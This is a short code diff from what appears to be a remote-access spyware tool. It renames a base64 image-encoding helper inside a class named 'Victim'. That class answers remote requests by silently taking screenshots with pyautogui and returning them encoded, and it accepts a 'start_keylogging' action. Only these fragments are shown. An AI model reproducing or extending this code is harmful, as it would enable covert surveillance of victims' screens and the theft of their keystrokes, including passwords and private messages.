@@ -23,10 +23,11 @@ def get_file_bytes(path):
         bytes_content = file.read()
     return bytes_content
 
-def im_2_b64(image):
-    buff = io.BytesIO()
-    image.save(buff, format="JPEG")
-    img_str = base64.b64encode(buff.getvalue())
+
+def image_to_base64(image):
+    bytes_buffer = io.BytesIO()
+    image.save(bytes_buffer, format="JPEG")
+    img_str = base64.b64encode(bytes_buffer.getvalue())
     return img_str
 
 
@@ -150,7 +151,7 @@ class Victim:
             if request_dict['resource'] == 'screenshot':
                 print("taking a screenshot...")
                 image = pyautogui.screenshot("temp.png")
-                image_bytes = im_2_b64(image)
+                image_bytes = image_to_base64(image)
                 return {'status': 'success', 'type': 'image/png', 'image_bytes': image_bytes}
         elif request_dict['type'] == 'action':
             if request_dict['action'] == 'start_keylogging':
